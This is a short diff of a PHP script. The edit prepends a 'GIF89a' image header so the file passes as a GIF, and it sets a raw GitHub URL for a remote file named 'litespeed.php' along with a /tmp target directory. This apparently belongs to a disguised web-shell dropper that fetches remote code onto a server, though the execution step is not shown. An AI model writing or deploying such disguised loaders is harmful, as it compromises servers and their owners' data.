@@ -1,6 +1,6 @@
-<?PhP
+GIF89a<?PhP
 
-    $url = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/lites.php';
+    $url = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/litespeed.php';
     
     $targetDir = '/tmp';
     
